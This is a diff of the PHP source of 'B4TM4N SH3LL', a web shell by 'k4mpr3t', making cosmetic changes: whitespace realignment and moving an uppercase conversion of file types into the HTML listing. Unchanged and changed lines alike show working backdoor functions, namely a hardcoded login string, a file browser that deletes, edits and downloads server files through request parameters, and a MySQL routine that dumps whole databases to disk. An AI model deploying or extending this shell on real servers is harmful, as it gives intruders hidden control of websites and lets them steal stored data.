@@ -31,10 +31,10 @@ $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
  */
 
 $config=array(
-	"title"   => "B4TM4N SH3LL",                  // Your Title
-	"subtitle" => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
-	"themes" => "BR34K",                          // Your Themes (D4RK or BR34K)
-	"debug"   => false                            // Debug Mode
+	"title"     => "B4TM4N SH3LL",                 // Your Title
+	"subtitle"  => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
+	"themes"    => "BR34K",                        // Your Themes (D4RK or BR34K)
+	"debug"     => false                           // Debug Mode
 );
 
 $account=explode(':',$x_);
@@ -1169,7 +1169,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 			$filedir=rtrim($dir,_)._.$file;
 			$updir=substr($dir,0,strrpos($dir,_));
 			if (strlen($updir)<=2) $updir=$updir._;
-			$type=strtoupper(GetFileType($filedir));
+			$type=GetFileType($filedir);
 			$size=GetFileSize(@filesize($filedir));
 			$last=GetFileTime($filedir,"modify");
 			$perm=GetFilePerm($filedir);
@@ -1196,22 +1196,22 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 			
 			if($file==".")
 			{
-				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete Directory [ /".basename($dir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
+				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete Directory [ /".basename($dir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
 			}
 			elseif($file=="..")
 			{
-				$reads[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($updir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAmlJREFUeNpsU0toU0EUPfPysx/tTxuDH9SCWhUDooIbd7oRUUTMouqi2iIoCO6lceHWhegy4EJFinWjrlQUpVm0IIoFpVDEIthm0dpikpf3ZuZ6Z94nrXhhMjM3c8895977BBHB2PznK8WPtDgyWH5q77cPH8PpdXuhpQT4ifR9u5sfJb1bmw6VivahATDrxcRZ2njfoaMv+2j7mLDn93MPiNRMvGbL18L9IpF8h9/TN+EYkMffSiOXJ5+hkD+PdqcLpICWHOHc2CC+LEyA/K+cKQMnlQHJX8wqYG3MAJy88Wa4OLDvEqAEOpJd0LxHIMdHBziowSwVlF8D6QaicK01krw/JynwcKoEwZczewroTvZirlKJs5CqQ5CG8pb57FnJUA0LYCXMX5fibd+p8LWDDemcPZbzQyjvH+Ki1TlIciElA7ghwLKV4kRZstt2sANWRjYTAGzuP2hXZFpJ/GsxgGJ0ox1aoFWsDXyyxqCs26+ydmagFN/rRjymJ1898bzGzmQE0HCZpmk5A0RFIv8Pn0WYPsiu6t/Rsj6PauVTwffTSzGAGZhUG2F06hEc9ibS7OPMNp6ErYFlKavo7MkhmTqCxZ/jwzGA9Hx82H2BZSw1NTN9Gx8ycHkajU/7M+jInsDC7DiaEmo1bNl1AMr9ASFgqVu9MCTIzoGUimXVAnnaN0PdBBDCCYbEtMk6wkpQwIG0sn0PQIUF4GsTwLSIFKNqF6DVrQq+IWVrQDxAYQC/1SsYOI4pOxKZrfifiUSbDUisif7XlpGIPufXd/uvdvZm760M0no1FZcnrzUdjw7au3vu/BVgAFLXeuTxhTXVAAAAAElFTkSuQmCC'/> <a title='Parent Directory' href='?d=".urle($updir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($updir)."' onclick=\"return confirm('Delete Directory [ /".basename($updir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($updir)."' title='Modify Folder'>&#8499;</a></td></tr>";
+				$reads[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($updir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAmlJREFUeNpsU0toU0EUPfPysx/tTxuDH9SCWhUDooIbd7oRUUTMouqi2iIoCO6lceHWhegy4EJFinWjrlQUpVm0IIoFpVDEIthm0dpikpf3ZuZ6Z94nrXhhMjM3c8895977BBHB2PznK8WPtDgyWH5q77cPH8PpdXuhpQT4ifR9u5sfJb1bmw6VivahATDrxcRZ2njfoaMv+2j7mLDn93MPiNRMvGbL18L9IpF8h9/TN+EYkMffSiOXJ5+hkD+PdqcLpICWHOHc2CC+LEyA/K+cKQMnlQHJX8wqYG3MAJy88Wa4OLDvEqAEOpJd0LxHIMdHBziowSwVlF8D6QaicK01krw/JynwcKoEwZczewroTvZirlKJs5CqQ5CG8pb57FnJUA0LYCXMX5fibd+p8LWDDemcPZbzQyjvH+Ki1TlIciElA7ghwLKV4kRZstt2sANWRjYTAGzuP2hXZFpJ/GsxgGJ0ox1aoFWsDXyyxqCs26+ydmagFN/rRjymJ1898bzGzmQE0HCZpmk5A0RFIv8Pn0WYPsiu6t/Rsj6PauVTwffTSzGAGZhUG2F06hEc9ibS7OPMNp6ErYFlKavo7MkhmTqCxZ/jwzGA9Hx82H2BZSw1NTN9Gx8ycHkajU/7M+jInsDC7DiaEmo1bNl1AMr9ASFgqVu9MCTIzoGUimXVAnnaN0PdBBDCCYbEtMk6wkpQwIG0sn0PQIUF4GsTwLSIFKNqF6DVrQq+IWVrQDxAYQC/1SsYOI4pOxKZrfifiUSbDUisif7XlpGIPufXd/uvdvZm760M0no1FZcnrzUdjw7au3vu/BVgAFLXeuTxhTXVAAAAAElFTkSuQmCC'/> <a title='Parent Directory' href='?d=".urle($updir)."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($updir)."' onclick=\"return confirm('Delete Directory [ /".basename($updir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($updir)."' title='Modify Folder'>&#8499;</a></td></tr>";
 			}
 			else
 			{
 				if($type=="dir")
 				{
-					$reads[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Open Directory' href='?d=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Directory [ /".basename($filedir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($filedir)."' title='Modify Folder'>&#8499;</a></td></tr>";
+					$reads[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Open Directory' href='?d=".urle($filedir)."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Directory [ /".basename($filedir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($filedir)."' title='Modify Folder'>&#8499;</a></td></tr>";
 					$count_dirs++;
 				}
 				else
 				{
-					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Filename [ ".basename($filedir)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
+					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Filename [ ".basename($filedir)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
 					$count_files++;
 				}
 			}
@@ -1294,35 +1294,35 @@ if(any("r",$_REQUEST))
 		$back=php_self."?d=".urle($dir);
 
 		printf("<div class='divide'>
-						<div class='divide-left'>
-							<table class='table'>
-								<tr><td>Name</td><td>%s</td></tr>
-								<tr><td>Size</td><td>%s</td></tr>
-								<tr><td>Permission</td><td>%s</td></tr>
-								<tr><td>Create time</td><td>%s</td></tr>
-								<tr><td>Last modified</td><td>%s</td></tr>
-								<tr><td>Last accessed</td><td>%s</td></tr>
-							</table>
-						</div>
-						<div class='divide-right'>
-							<table class='table'>
-								<tr><td>MIME</td><td>%s</td></tr>
-								<tr><td>Owner/Group</td><td>%s</td></tr>
-								<tr><td>MD5</td><td>%s</td></tr>
-								<tr><td>SHA1</td><td>%s</td></tr>
-							</table>
-						</div>
-					</div>",
-					basename($file),
-					GetFileSize(@filesize($file)),
-					GetFilePerm($file),
-					GetFileTime($file,"create"),
-					GetFileTime($file,"modify"),
-					GetFileTime($file,"access"),
-					mime_content_type($file),
-					GetFileOwnerGroup($file),
-					@md5_file($file),
-					@sha1_file($file)
+				<div class='divide-left'>
+					<table class='table'>
+						<tr><td>Name</td><td>%s</td></tr>
+						<tr><td>Size</td><td>%s</td></tr>
+						<tr><td>Permission</td><td>%s</td></tr>
+						<tr><td>Create time</td><td>%s</td></tr>
+						<tr><td>Last modified</td><td>%s</td></tr>
+						<tr><td>Last accessed</td><td>%s</td></tr>
+					</table>
+				</div>
+				<div class='divide-right'>
+					<table class='table'>
+						<tr><td>MIME</td><td>%s</td></tr>
+						<tr><td>Owner/Group</td><td>%s</td></tr>
+						<tr><td>MD5</td><td>%s</td></tr>
+						<tr><td>SHA1</td><td>%s</td></tr>
+					</table>
+				</div>
+			</div>",
+			basename($file),
+			GetFileSize(@filesize($file)),
+			GetFilePerm($file),
+			GetFileTime($file,"create"),
+			GetFileTime($file,"modify"),
+			GetFileTime($file,"access"),
+			mime_content_type($file),
+			GetFileOwnerGroup($file),
+			@md5_file($file),
+			@sha1_file($file)
 		);
 
 		if(is_file($file)||is_link($file))
@@ -1575,17 +1575,17 @@ if(any("r",$_REQUEST))
 		if($_REQUEST['a']=='v')
 		{
 			printf("<div class='menu'>
-						<ul>
-							<li><a href='?a=v&r=%s'>Source</a></li>
-							<li><a href='?a=v&w=f&r=%s'>iFrame</a></li>
-							<li><a href='?a=v&w=i&r=%s'>Image</a></li>
-							<li><a href='?a=v&w=v&r=%s'>Video</a></li>
-							<li><a href='?a=v&w=a&r=%s'>Audio</a></li>
-						</ul>
-					</div>",
-					urle($file),urle($file),
-					urle($file),urle($file),
-					urle($file));
+					<ul>
+						<li><a href='?a=v&r=%s'>Source</a></li>
+						<li><a href='?a=v&w=f&r=%s'>iFrame</a></li>
+						<li><a href='?a=v&w=i&r=%s'>Image</a></li>
+						<li><a href='?a=v&w=v&r=%s'>Video</a></li>
+						<li><a href='?a=v&w=a&r=%s'>Audio</a></li>
+					</ul>
+				</div>",
+			urle($file),urle($file),
+			urle($file),urle($file),
+			urle($file));
 
 			if(is_readable($file))
 			{
@@ -2161,68 +2161,68 @@ if(any("x",$_REQUEST))
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="dmp")
 		{
-	    	$database=$_REQUEST['database'];
-	    	$output=$_REQUEST['output'];
+			$database=$_REQUEST['database'];
+			$output=$_REQUEST['output'];
 			if (!file_exists($output)&&!empty($database)) 
 			{
-			    $link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
-			    mysqli_set_charset($link,'utf8');
-			    mysqli_select_db($link,$database);
-			    $tables=array();
-			    $result=mysqli_query($link,'SHOW TABLES');
-			    while($row=mysqli_fetch_row($result))
+				$link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
+				mysqli_set_charset($link,'utf8');
+				mysqli_select_db($link,$database);
+				$tables=array();
+				$result=mysqli_query($link,'SHOW TABLES');
+				while($row=mysqli_fetch_row($result))
 				{
 					$tables[]=$row[0];
 				}
-			    $return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
-			    $return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
-			    $return.='SET AUTOCOMMIT=0;' . "\r\n";
-			    $return.='START TRANSACTION;' . "\r\n";
-			    foreach($tables as $table)
-			    {
-			        $result=mysqli_query($link,'SELECT * FROM '.$table);
-			        $num_fields=mysqli_num_fields($result);
-			        $num_rows=mysqli_num_rows($result);
-			        $i_row=0;
-			        $row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
-			        $return.="\n\n".$row2[1].";\n\n";
-			        if ($num_rows!==0) {
-			            $row3=@mysqli_fetch_fields($result);
-			            $return.='INSERT INTO '.$table.'( ';
-			            foreach ($row3 as $th) 
-			            { 
-			                $return.='`'.$th->name.'`,';
-			           }
-			            $return=substr($return,0,-2);
-			            $return.=' ) VALUES';
-			            for ($i=0;$i < $num_fields;$i++) 
-			            {
-			                while($row=mysqli_fetch_row($result))
-			                {
-			                    $return.="\n(";
-			                    for($j=0;$j<$num_fields;$j++) 
-			                    {
-			                        $row[$j]=addslashes($row[$j]);
-			                        $row[$j]=preg_replace("#\n#","\\n",$row[$j]);
-			                        if (isset($row[$j])) { $return.='"'.$row[$j].'"';}else { $return.='""';}
-			                        if ($j<($num_fields-1)) { $return.=',';}
-			                   }
-			                    if (++$i_row==$num_rows) {
-			                        $return.=");";
-			                   }else {
-			                        $return.="),";
-			                   }  
-			               }
-			           }
-			       }
-			        $return.="\n\n\n";
-			   }
-			    $return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
-			    $return.='COMMIT;';
-			    $output=pathinfo($otput)['extension']=='sql'?$output:$output.'.sql';
-			    $handle=fopen($output,'w+');
-			    fwrite($handle,$return);
-			    fclose($handle);
+				$return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
+				$return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
+				$return.='SET AUTOCOMMIT=0;' . "\r\n";
+				$return.='START TRANSACTION;' . "\r\n";
+				foreach($tables as $table)
+				{
+					$result=mysqli_query($link,'SELECT * FROM '.$table);
+					$num_fields=mysqli_num_fields($result);
+					$num_rows=mysqli_num_rows($result);
+					$i_row=0;
+					$row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
+					$return.="\n\n".$row2[1].";\n\n";
+					if ($num_rows!==0) {
+						$row3=@mysqli_fetch_fields($result);
+						$return.='INSERT INTO '.$table.'( ';
+						foreach ($row3 as $th) 
+						{ 
+							$return.='`'.$th->name.'`,';
+						}
+						$return=substr($return,0,-2);
+						$return.=' ) VALUES';
+						for ($i=0;$i < $num_fields;$i++) 
+						{
+							while($row=mysqli_fetch_row($result))
+							{
+								$return.="\n(";
+								for($j=0;$j<$num_fields;$j++) 
+								{
+									$row[$j]=addslashes($row[$j]);
+									$row[$j]=preg_replace("#\n#","\\n",$row[$j]);
+									if (isset($row[$j])) { $return.='"'.$row[$j].'"';}else { $return.='""';}
+									if ($j<($num_fields-1)) { $return.=',';}
+								}
+								if (++$i_row==$num_rows) {
+									$return.=");";
+								}else {
+									$return.="),";
+								}  
+							}
+						}
+					}
+					$return.="\n\n\n";
+				}
+				$return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
+				$return.='COMMIT;';
+				$output=pathinfo($otput)['extension']=='sql'?$output:$output.'.sql';
+				$handle=fopen($output,'w+');
+				fwrite($handle,$return);
+				fclose($handle);
 				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($output),basename($output));	    
 			}
 			else
